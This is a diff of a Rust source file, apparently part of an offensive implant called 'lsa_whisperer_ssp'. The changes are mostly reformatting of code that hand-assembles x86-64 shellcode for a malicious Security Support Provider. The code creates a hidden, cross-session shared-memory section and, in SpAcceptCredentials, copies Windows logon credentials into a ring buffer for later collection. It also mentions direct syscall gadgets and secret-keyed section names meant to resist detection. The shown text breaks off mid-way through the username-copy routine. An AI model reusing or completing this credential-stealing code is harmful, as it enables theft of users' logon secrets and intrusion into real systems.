@@ -69,8 +69,7 @@ pub const SHM_SIZE: usize = 16 + (RING_CAPACITY as usize) * CRED_SLOT_SIZE;
 /// Format: `Global\` + 32 lowercase hex chars (HKDF of PSK+nonce) + `_`
 /// + 16 hex chars (nonce).  The `Global\` prefix ensures cross-session
 /// visibility.  If no PSK is configured, falls back to random bytes.
-static SHM_NAME: once_cell::sync::Lazy<Vec<u16>> =
-    once_cell::sync::Lazy::new(generate_shm_name);
+static SHM_NAME: once_cell::sync::Lazy<Vec<u16>> = once_cell::sync::Lazy::new(generate_shm_name);
 
 #[inline(always)]
 fn invoke_nt_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
@@ -95,14 +94,13 @@ fn invoke_nt_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
 fn generate_shm_name() -> Vec<u16> {
     use rand::RngCore;
 
-    let psk = crate::outbound::resolve_secret()
-        .unwrap_or_else(|| {
-            log::warn!("lsa_whisperer_ssp: no PSK configured; SHM name uses random fallback");
-            // Fall back to random bytes so the agent still works in dev/test.
-            let mut ikm = [0u8; 32];
-            rand::rngs::OsRng.fill_bytes(&mut ikm);
-            hex::encode(ikm)
-        });
+    let psk = crate::outbound::resolve_secret().unwrap_or_else(|| {
+        log::warn!("lsa_whisperer_ssp: no PSK configured; SHM name uses random fallback");
+        // Fall back to random bytes so the agent still works in dev/test.
+        let mut ikm = [0u8; 32];
+        rand::rngs::OsRng.fill_bytes(&mut ikm);
+        hex::encode(ikm)
+    });
 
     // V4-3-02: Per-injection random nonce prevents section name prediction
     // even if the PSK is known.  The nonce is included in the section name
@@ -215,7 +213,7 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
 
     const OFF_SSP_SHUTDOWN: usize = 0x200;
     const OFF_DATA: usize = 0x500;
-    const OFF_FT: usize   = 0x600;
+    const OFF_FT: usize = 0x600;
 
     let mut blob = Vec::with_capacity(0x800);
 
@@ -230,32 +228,32 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     const L_INIT_EPILOGUE: usize = 0;
 
     // ── Prologue ──────────────────────────────────────────────────
-    blob.extend_from_slice(&[0x55]);                         // push rbp
-    blob.extend_from_slice(&[0x53]);                         // push rbx
-    blob.extend_from_slice(&[0x56]);                         // push rsi
-    blob.extend_from_slice(&[0x57]);                         // push rdi
-    blob.extend_from_slice(&[0x41, 0x54]);                   // push r12
-    blob.extend_from_slice(&[0x41, 0x55]);                   // push r13
-    blob.extend_from_slice(&[0x41, 0x56]);                   // push r14
-    blob.extend_from_slice(&[0x41, 0x57]);                   // push r15
-    blob.extend_from_slice(&[0x48, 0x81, 0xEC]);             // sub rsp, 0x108
+    blob.extend_from_slice(&[0x55]); // push rbp
+    blob.extend_from_slice(&[0x53]); // push rbx
+    blob.extend_from_slice(&[0x56]); // push rsi
+    blob.extend_from_slice(&[0x57]); // push rdi
+    blob.extend_from_slice(&[0x41, 0x54]); // push r12
+    blob.extend_from_slice(&[0x41, 0x55]); // push r13
+    blob.extend_from_slice(&[0x41, 0x56]); // push r14
+    blob.extend_from_slice(&[0x41, 0x57]); // push r15
+    blob.extend_from_slice(&[0x48, 0x81, 0xEC]); // sub rsp, 0x108
     blob.extend_from_slice(&0x108u32.to_le_bytes());
 
     // Get position-independent anchor: call $+5; pop r15
     blob.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
-    blob.extend_from_slice(&[0x41, 0x5F]);                   // pop r15
+    blob.extend_from_slice(&[0x41, 0x5F]); // pop r15
     let r15_off_init = blob.len() - 2;
 
     // Deltas from r15 to key blob offsets for SpInitialize
-    let d_data_init  = (OFF_DATA         - r15_off_init) as u32;
-    let d_ft_create  = (OFF_FT           - r15_off_init) as u32; // NtCreateSection
-    let d_ft_map_i   = (OFF_FT + 0x10    - r15_off_init) as u32; // NtMapViewOfSection
+    let d_data_init = (OFF_DATA - r15_off_init) as u32;
+    let d_ft_create = (OFF_FT - r15_off_init) as u32; // NtCreateSection
+    let d_ft_map_i = (OFF_FT + 0x10 - r15_off_init) as u32; // NtMapViewOfSection
 
     // ── Zero the stack frame (33 qwords) ──────────────────────────
-    blob.extend_from_slice(&[0x31, 0xC0]);                           // xor eax, eax
-    blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]);        // mov ecx, 33
-    blob.extend_from_slice(&[0x48, 0x89, 0xE7]);                     // mov rdi, rsp
-    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);                     // rep stosq
+    blob.extend_from_slice(&[0x31, 0xC0]); // xor eax, eax
+    blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]); // mov ecx, 33
+    blob.extend_from_slice(&[0x48, 0x89, 0xE7]); // mov rdi, rsp
+    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]); // rep stosq
 
     // ── Build UNICODE_STRING at [rsp+0x68] ────────────────────────
     // (Name bytes are resolved later when SHM_NAME is available, but the
@@ -265,7 +263,7 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     let name_byte_len = (name_chars * 2) as u16;
 
     // Buffer = r15 + d_data_init (address of name bytes in the blob)
-    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_data_init]
+    blob.extend_from_slice(&[0x49, 0x8D, 0x87]); // lea rax, [r15+d_data_init]
     blob.extend_from_slice(&d_data_init.to_le_bytes());
     blob.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x70]); // mov [rsp+0x70], rax
     blob.extend_from_slice(&[0x66, 0xC7, 0x44, 0x24, 0x68]); // mov word [rsp+0x68], len
@@ -277,7 +275,7 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0x48, 0x8D, 0x5C, 0x24, 0x78]); // lea rbx, [rsp+0x78]
     blob.extend_from_slice(&[0xC7, 0x03, 0x30, 0x00, 0x00, 0x00]); // mov dword [rbx], 48
     blob.extend_from_slice(&[0x48, 0x8D, 0x44, 0x24, 0x68]); // lea rax, [rsp+0x68]
-    blob.extend_from_slice(&[0x48, 0x89, 0x43, 0x10]);        // mov [rbx+0x10], rax
+    blob.extend_from_slice(&[0x48, 0x89, 0x43, 0x10]); // mov [rbx+0x10], rax
     blob.extend_from_slice(&[0xC7, 0x43, 0x18, 0x40, 0x00, 0x00, 0x00]); // mov dword [rbx+0x18], 0x40
 
     // ── Build LARGE_INTEGER SectionSize at [rsp+0xA8] ─────────────
@@ -288,19 +286,16 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // ── NtCreateSection(&handle, SECTION_ALL_ACCESS, &obj_attr,
     //                    &section_size, PAGE_READWRITE, SEC_COMMIT, NULL) ──
     // Stack params (5th–7th):
-    blob.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20,
-                             0x04, 0x00, 0x00, 0x00]);         // [rsp+0x20] SectionPageProtection = PAGE_READWRITE
-    blob.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28,
-                             0x00, 0x00, 0x00, 0x08]);         // [rsp+0x28] AllocationAttributes = SEC_COMMIT (0x08000000)
-    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x30,
-                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x30] FileHandle = NULL
+    blob.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20, 0x04, 0x00, 0x00, 0x00]); // [rsp+0x20] SectionPageProtection = PAGE_READWRITE
+    blob.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x08]); // [rsp+0x28] AllocationAttributes = SEC_COMMIT (0x08000000)
+    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00]); // [rsp+0x30] FileHandle = NULL
 
     // Load NtCreateSection function pointer
-    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft_create]
+    blob.extend_from_slice(&[0x49, 0x8D, 0x87]); // lea rax, [r15+d_ft_create]
     blob.extend_from_slice(&d_ft_create.to_le_bytes());
-    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
-    blob.extend_from_slice(&[0x48, 0x85, 0xC0]);             // test rax, rax
-    // jz epilogue (near)
+    blob.extend_from_slice(&[0x48, 0x8B, 0x00]); // mov rax, [rax]
+    blob.extend_from_slice(&[0x48, 0x85, 0xC0]); // test rax, rax
+                                                 // jz epilogue (near)
     let jz_create_patch = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
     init_near_patches.push((jz_create_patch, L_INIT_EPILOGUE));
@@ -309,19 +304,18 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x50]); // lea rcx, [rsp+0x50] &SectionHandle
     blob.extend_from_slice(&[0xBA, 0x1F, 0x00, 0x0F, 0x00]); // mov edx, SECTION_ALL_ACCESS (0x000F001F)
     blob.extend_from_slice(&[0x4C, 0x8D, 0x44, 0x24, 0x78]); // lea r8, [rsp+0x78]  &ObjectAttributes
-    blob.extend_from_slice(&[0x4C, 0x8D, 0x8C, 0x24,
-                             0xA8, 0x00, 0x00, 0x00]);         // lea r9, [rsp+0xA8] &SectionSize
-    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
-    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
-    // js epilogue (near)
+    blob.extend_from_slice(&[0x4C, 0x8D, 0x8C, 0x24, 0xA8, 0x00, 0x00, 0x00]); // lea r9, [rsp+0xA8] &SectionSize
+    blob.extend_from_slice(&[0xFF, 0xD0]); // call rax
+    blob.extend_from_slice(&[0x85, 0xC0]); // test eax, eax
+                                           // js epilogue (near)
     let js_create_patch = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x88, 0x00, 0x00, 0x00, 0x00]);
     init_near_patches.push((js_create_patch, L_INIT_EPILOGUE));
 
     // Check SectionHandle
     blob.extend_from_slice(&[0x48, 0x8B, 0x5C, 0x24, 0x50]); // mov rbx, [rsp+0x50]
-    blob.extend_from_slice(&[0x48, 0x85, 0xDB]);             // test rbx, rbx
-    // jz epilogue (near)
+    blob.extend_from_slice(&[0x48, 0x85, 0xDB]); // test rbx, rbx
+                                                 // jz epilogue (near)
     let jz_handle_patch = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
     init_near_patches.push((jz_handle_patch, L_INIT_EPILOGUE));
@@ -332,40 +326,34 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     blob.extend_from_slice(&(SHM_SIZE as u32).to_le_bytes());
 
     // Stack params (5th–10th):
-    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20,
-                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x20] CommitSize = 0
-    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x28,
-                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x28] SectionOffset = NULL
+    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]); // [rsp+0x20] CommitSize = 0
+    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00]); // [rsp+0x28] SectionOffset = NULL
     blob.extend_from_slice(&[0x48, 0x8D, 0x44, 0x24, 0x60]); // lea rax, [rsp+0x60]
     blob.extend_from_slice(&[0x48, 0x89, 0x44, 0x24, 0x30]); // [rsp+0x30] = &ViewSize
-    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x38,
-                             0x01, 0x00, 0x00, 0x00]);         // [rsp+0x38] InheritDisposition = 1
-    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x40,
-                             0x00, 0x00, 0x00, 0x00]);         // [rsp+0x40] AllocationType = 0
-    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x48,
-                             0x04, 0x00, 0x00, 0x00]);         // [rsp+0x48] Win32Protect = PAGE_READWRITE
+    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x38, 0x01, 0x00, 0x00, 0x00]); // [rsp+0x38] InheritDisposition = 1
+    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00]); // [rsp+0x40] AllocationType = 0
+    blob.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x48, 0x04, 0x00, 0x00, 0x00]); // [rsp+0x48] Win32Protect = PAGE_READWRITE
 
     // Load NtMapViewOfSection
-    blob.extend_from_slice(&[0x49, 0x8D, 0x87]);             // lea rax, [r15+d_ft_map_i]
+    blob.extend_from_slice(&[0x49, 0x8D, 0x87]); // lea rax, [r15+d_ft_map_i]
     blob.extend_from_slice(&d_ft_map_i.to_le_bytes());
-    blob.extend_from_slice(&[0x48, 0x8B, 0x00]);             // mov rax, [rax]
-    // Register params
+    blob.extend_from_slice(&[0x48, 0x8B, 0x00]); // mov rax, [rax]
+                                                 // Register params
     blob.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x50]); // mov rcx, [rsp+0x50] SectionHandle
-    blob.extend_from_slice(&[0x48, 0xC7, 0xC2,
-                             0xFF, 0xFF, 0xFF, 0xFF]);         // mov rdx, -1 (current process)
+    blob.extend_from_slice(&[0x48, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF]); // mov rdx, -1 (current process)
     blob.extend_from_slice(&[0x4C, 0x8D, 0x44, 0x24, 0x58]); // lea r8, [rsp+0x58] &BaseAddress
-    blob.extend_from_slice(&[0x45, 0x31, 0xC9]);             // xor r9d, r9d  ZeroBits=0
-    blob.extend_from_slice(&[0xFF, 0xD0]);                     // call rax
-    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
-    // js epilogue (near) — on failure, jump to epilogue (no cleanup needed)
+    blob.extend_from_slice(&[0x45, 0x31, 0xC9]); // xor r9d, r9d  ZeroBits=0
+    blob.extend_from_slice(&[0xFF, 0xD0]); // call rax
+    blob.extend_from_slice(&[0x85, 0xC0]); // test eax, eax
+                                           // js epilogue (near) — on failure, jump to epilogue (no cleanup needed)
     let js_map_init_patch = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x88, 0x00, 0x00, 0x00, 0x00]);
     init_near_patches.push((js_map_init_patch, L_INIT_EPILOGUE));
 
     // Load mapped base address
     blob.extend_from_slice(&[0x4C, 0x8B, 0x74, 0x24, 0x58]); // mov r14, [rsp+0x58]
-    blob.extend_from_slice(&[0x4D, 0x85, 0xF6]);             // test r14, r14
-    // jz epilogue (near)
+    blob.extend_from_slice(&[0x4D, 0x85, 0xF6]); // test r14, r14
+                                                 // jz epilogue (near)
     let jz_base_init_patch = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
     init_near_patches.push((jz_base_init_patch, L_INIT_EPILOGUE));
@@ -374,11 +362,11 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // SHM_SIZE / 8 qwords — ensures header and all slots are zeroed.
     // Although SEC_COMMIT pages are zeroed by the OS, we zero explicitly
     // to be safe against stale page-file contents.
-    blob.extend_from_slice(&[0xB9]);                           // mov ecx, SHM_SIZE / 8
+    blob.extend_from_slice(&[0xB9]); // mov ecx, SHM_SIZE / 8
     blob.extend_from_slice(&(SHM_SIZE as u32 / 8).to_le_bytes());
-    blob.extend_from_slice(&[0x48, 0x89, 0xF7]);             // mov rdi, r14
-    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
-    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);             // rep stosq
+    blob.extend_from_slice(&[0x48, 0x89, 0xF7]); // mov rdi, r14
+    blob.extend_from_slice(&[0x31, 0xC0]); // xor eax, eax
+    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]); // rep stosq
 
     // ── Store the mapped base address at OFF_DATA + OFF_STORED_BASE ──
     // V3-04 fix: SpAcceptCredentials reads the base from this location
@@ -386,7 +374,7 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // is kept alive for the lifetime of the SSP.
     let d_stored_base = (OFF_DATA + OFF_STORED_BASE - r15_off_init) as u32;
     // mov [r15+d_stored_base], r14
-    blob.extend_from_slice(&[0x4D, 0x89, 0xB7]);             // mov [r15+disp32], r14
+    blob.extend_from_slice(&[0x4D, 0x89, 0xB7]); // mov [r15+disp32], r14
     blob.extend_from_slice(&d_stored_base.to_le_bytes());
 
     // ── epilogue (NO unmap, NO close — section stays alive) ───────
@@ -395,18 +383,18 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     //   (a) the named section object remains in the NT namespace, and
     //   (b) SpAcceptCredentials can read the stored base address.
     init_label_offsets[L_INIT_EPILOGUE] = blob.len();
-    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax  (STATUS_SUCCESS)
-    blob.extend_from_slice(&[0x48, 0x81, 0xC4]);             // add rsp, 0x108
+    blob.extend_from_slice(&[0x31, 0xC0]); // xor eax, eax  (STATUS_SUCCESS)
+    blob.extend_from_slice(&[0x48, 0x81, 0xC4]); // add rsp, 0x108
     blob.extend_from_slice(&0x108u32.to_le_bytes());
-    blob.extend_from_slice(&[0x41, 0x5F]);                     // pop r15
-    blob.extend_from_slice(&[0x41, 0x5E]);                     // pop r14
-    blob.extend_from_slice(&[0x41, 0x5D]);                     // pop r13
-    blob.extend_from_slice(&[0x41, 0x5C]);                     // pop r12
-    blob.extend_from_slice(&[0x5F]);                         // pop rdi
-    blob.extend_from_slice(&[0x5E]);                         // pop rsi
-    blob.extend_from_slice(&[0x5B]);                         // pop rbx
-    blob.extend_from_slice(&[0x5D]);                         // pop rbp
-    blob.push(0xC3);                                         // ret
+    blob.extend_from_slice(&[0x41, 0x5F]); // pop r15
+    blob.extend_from_slice(&[0x41, 0x5E]); // pop r14
+    blob.extend_from_slice(&[0x41, 0x5D]); // pop r13
+    blob.extend_from_slice(&[0x41, 0x5C]); // pop r12
+    blob.extend_from_slice(&[0x5F]); // pop rdi
+    blob.extend_from_slice(&[0x5E]); // pop rsi
+    blob.extend_from_slice(&[0x5B]); // pop rbx
+    blob.extend_from_slice(&[0x5D]); // pop rbp
+    blob.push(0xC3); // ret
 
     // ── Patch near jumps for SpInitialize ─────────────────────────
     for &(patch_off, lbl) in &init_near_patches {
@@ -422,10 +410,9 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     //  SpShutDown (OFF_SSP_SHUTDOWN) — stub: return STATUS_SUCCESS
     // ═══════════════════════════════════════════════════════════════
     blob.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
-    blob.extend_from_slice(&[0x31, 0xC0]);               // xor eax, eax
+    blob.extend_from_slice(&[0x31, 0xC0]); // xor eax, eax
     blob.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
-    blob.push(0xC3);                                     // ret
-
+    blob.push(0xC3); // ret
 
     // ═══════════════════════════════════════════════════════════════
     //  SpAcceptCredentials (~0x040) — credential capture
@@ -470,30 +457,30 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // ═══════════════════════════════════════════════════════════════
 
     // ── Prologue ──────────────────────────────────────────────────
-    blob.extend_from_slice(&[0x55]);                         // push rbp
-    blob.extend_from_slice(&[0x53]);                         // push rbx
-    blob.extend_from_slice(&[0x56]);                         // push rsi
-    blob.extend_from_slice(&[0x57]);                         // push rdi
-    blob.extend_from_slice(&[0x41, 0x54]);                   // push r12
-    blob.extend_from_slice(&[0x41, 0x55]);                   // push r13
-    blob.extend_from_slice(&[0x41, 0x56]);                   // push r14
-    blob.extend_from_slice(&[0x41, 0x57]);                   // push r15
-    blob.extend_from_slice(&[0x48, 0x81, 0xEC]);             // sub rsp, 0x28
+    blob.extend_from_slice(&[0x55]); // push rbp
+    blob.extend_from_slice(&[0x53]); // push rbx
+    blob.extend_from_slice(&[0x56]); // push rsi
+    blob.extend_from_slice(&[0x57]); // push rdi
+    blob.extend_from_slice(&[0x41, 0x54]); // push r12
+    blob.extend_from_slice(&[0x41, 0x55]); // push r13
+    blob.extend_from_slice(&[0x41, 0x56]); // push r14
+    blob.extend_from_slice(&[0x41, 0x57]); // push r15
+    blob.extend_from_slice(&[0x48, 0x81, 0xEC]); // sub rsp, 0x28
     blob.extend_from_slice(&0x28u32.to_le_bytes());
-    blob.extend_from_slice(&[0x4D, 0x89, 0xC5]);             // mov r13, r8   (3rd param — PSECPKG_PRIMARY_CREDENTIALS)
-    // Get position-independent anchor: call $+5; pop r15
+    blob.extend_from_slice(&[0x4D, 0x89, 0xC5]); // mov r13, r8   (3rd param — PSECPKG_PRIMARY_CREDENTIALS)
+                                                 // Get position-independent anchor: call $+5; pop r15
     blob.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]); // call $+5
-    blob.extend_from_slice(&[0x41, 0x5F]);                   // pop r15
+    blob.extend_from_slice(&[0x41, 0x5F]); // pop r15
     let r15_off = blob.len() - 2;
 
     // Delta from r15 to the stored base address in the data section
     let d_stored_base = (OFF_DATA + OFF_STORED_BASE - r15_off) as u32;
 
     // ── Validate credential pointer ───────────────────────────────
-    blob.extend_from_slice(&[0x4D, 0x85, 0xED]);             // test r13, r13
-    // jz epilogue (short, +0)
-    // We'll emit a near jz; patch target later.  Use the same
-    // label-patching scheme as SpInitialize.
+    blob.extend_from_slice(&[0x4D, 0x85, 0xED]); // test r13, r13
+                                                 // jz epilogue (short, +0)
+                                                 // We'll emit a near jz; patch target later.  Use the same
+                                                 // label-patching scheme as SpInitialize.
     let cred_jz_epilogue = blob.len() + 2;
     // Placeholder: jz rel32 (6 bytes)
     blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
@@ -502,10 +489,10 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // V3-04 fix: SpInitialize stored the base at OFF_DATA + OFF_STORED_BASE.
     // No NtOpenSection/NtMapViewOfSection calls needed.
     // mov r14, [r15+d_stored_base]
-    blob.extend_from_slice(&[0x49, 0x8B, 0xB7]);             // mov r14, [r15+disp32]
+    blob.extend_from_slice(&[0x49, 0x8B, 0xB7]); // mov r14, [r15+disp32]
     blob.extend_from_slice(&d_stored_base.to_le_bytes());
-    blob.extend_from_slice(&[0x4D, 0x85, 0xF6]);             // test r14, r14
-    // jz epilogue (near) — if base is NULL, SpInitialize must have failed
+    blob.extend_from_slice(&[0x4D, 0x85, 0xF6]); // test r14, r14
+                                                 // jz epilogue (near) — if base is NULL, SpInitialize must have failed
     let base_jz_epilogue = blob.len() + 2;
     blob.extend_from_slice(&[0x0F, 0x84, 0x00, 0x00, 0x00, 0x00]);
 
@@ -521,23 +508,21 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     //
     // After xadd, ecx holds the OLD index.  Compute the slot from it.
     blob.extend_from_slice(&[0xB9, 0x01, 0x00, 0x00, 0x00]); // mov ecx, 1
-    // lock xadd [r14], ecx
+                                                             // lock xadd [r14], ecx
     blob.extend_from_slice(&[0xF0, 0x41, 0x0F, 0xC1, 0x0E]); // F0=LOCK 41=REX.B 0FC1=XADD /1=0E=[r14]
 
     // ── Compute slot address from old index ────────────────────────
     // slot_offset = (old_index % 256) * CRED_SLOT_SIZE(264)
-    blob.extend_from_slice(&[0x81, 0xE1, 0xFF, 0x00,
-                             0x00, 0x00]);                     // and ecx, 0x000000FF
-    blob.extend_from_slice(&[0x69, 0xC9, 0x08, 0x01,
-                             0x00, 0x00]);                     // imul ecx, ecx, 264
-    blob.extend_from_slice(&[0x49, 0x8D, 0x5E, 0x10]);       // lea rbx, [r14+16]  (slots start after 16-byte header)
-    blob.extend_from_slice(&[0x48, 0x03, 0xD9]);             // add rbx, rcx  → rbx = &CredSlot[slot]
+    blob.extend_from_slice(&[0x81, 0xE1, 0xFF, 0x00, 0x00, 0x00]); // and ecx, 0x000000FF
+    blob.extend_from_slice(&[0x69, 0xC9, 0x08, 0x01, 0x00, 0x00]); // imul ecx, ecx, 264
+    blob.extend_from_slice(&[0x49, 0x8D, 0x5E, 0x10]); // lea rbx, [r14+16]  (slots start after 16-byte header)
+    blob.extend_from_slice(&[0x48, 0x03, 0xD9]); // add rbx, rcx  → rbx = &CredSlot[slot]
 
     // ── Zero the slot (33 qwords = 264 bytes) ─────────────────────
-    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
-    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
+    blob.extend_from_slice(&[0x48, 0x89, 0xDF]); // mov rdi, rbx
+    blob.extend_from_slice(&[0x31, 0xC0]); // xor eax, eax
     blob.extend_from_slice(&[0xB9, 0x21, 0x00, 0x00, 0x00]); // mov ecx, 33
-    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]);             // rep stosq
+    blob.extend_from_slice(&[0xF3, 0x48, 0xAB]); // rep stosq
 
     // ═══════════════════════════════════════════════════════════════
     //  Copy credential fields (V3-01 fix: two-level pointer deref)
@@ -551,129 +536,121 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
 
     // ── Copy DownlevelName (PUNICODE_STRING at r13+0x08) ──────────
     // Read pointer to UNICODE_STRING
-    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x08]);       // mov r12, [r13+0x08]     (4 bytes)
-    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12            (3 bytes)
-    // Sequence after jz (to skip_username):
-    //   movzx eax, word [r12+0x00]        6 bytes  (41 0F B7 44 24 00)
-    //   test eax, eax                     2 bytes  (85 C0)
-    //   jz +0x20                          2 bytes  (74 20)
-    //   cmp eax, 128                      5 bytes  (3D 80 00 00 00)
-    //   jbe +5                            2 bytes  (76 05)
-    //   mov eax, 128                      5 bytes  (B8 80 00 00 00)
-    //   mov ecx, eax                      2 bytes  (89 C1)
-    //   mov r12, [r12+0x08]               5 bytes  (49 8B 64 24 08)
-    //   test r12, r12                     3 bytes  (4D 85 E4)
-    //   jz +0x08                          2 bytes  (74 08)
-    //   mov rsi, r12                      3 bytes  (4C 89 E6)
-    //   mov rdi, rbx                      3 bytes  (48 89 DF)
-    //   rep movsb                         2 bytes  (F3 A4)
-    //   Total: 42 bytes → jz = 0x2A
-    blob.extend_from_slice(&[0x74, 0x2A]);                     // jz skip_username (42 bytes)
-    // Read Length from UNICODE_STRING
-    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24,
-                             0x00]);                             // movzx eax, word [r12+0x00]
-    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
-    // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+mov(3)+rep(2) = 32 → 0x20
-    blob.extend_from_slice(&[0x74, 0x20]);                     // jz skip_username (32 bytes to end of block)
+    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x08]); // mov r12, [r13+0x08]     (4 bytes)
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]); // test r12, r12            (3 bytes)
+                                                 // Sequence after jz (to skip_username):
+                                                 //   movzx eax, word [r12+0x00]        6 bytes  (41 0F B7 44 24 00)
+                                                 //   test eax, eax                     2 bytes  (85 C0)
+                                                 //   jz +0x20                          2 bytes  (74 20)
+                                                 //   cmp eax, 128                      5 bytes  (3D 80 00 00 00)
+                                                 //   jbe +5                            2 bytes  (76 05)
+                                                 //   mov eax, 128                      5 bytes  (B8 80 00 00 00)
+                                                 //   mov ecx, eax                      2 bytes  (89 C1)
+                                                 //   mov r12, [r12+0x08]               5 bytes  (49 8B 64 24 08)
+                                                 //   test r12, r12                     3 bytes  (4D 85 E4)
+                                                 //   jz +0x08                          2 bytes  (74 08)
+                                                 //   mov rsi, r12                      3 bytes  (4C 89 E6)
+                                                 //   mov rdi, rbx                      3 bytes  (48 89 DF)
+                                                 //   rep movsb                         2 bytes  (F3 A4)
+                                                 //   Total: 42 bytes → jz = 0x2A
+    blob.extend_from_slice(&[0x74, 0x2A]); // jz skip_username (42 bytes)
+                                           // Read Length from UNICODE_STRING
+    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24, 0x00]); // movzx eax, word [r12+0x00]
+    blob.extend_from_slice(&[0x85, 0xC0]); // test eax, eax
+                                           // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+mov(3)+rep(2) = 32 → 0x20
+    blob.extend_from_slice(&[0x74, 0x20]); // jz skip_username (32 bytes to end of block)
     blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
-    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
+    blob.extend_from_slice(&[0x76, 0x05]); // jbe +5
     blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
-    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
-    // Read Buffer from UNICODE_STRING
-    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24,
-                             0x08]);                             // mov r12, [r12+0x08]
-    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
-    // Inner skip: 3+3+2 = 8 bytes → jz = 0x08
-    blob.extend_from_slice(&[0x74, 0x08]);                     // jz skip_username
-    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
-    blob.extend_from_slice(&[0x48, 0x89, 0xDF]);             // mov rdi, rbx
-    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
-    // skip_username:
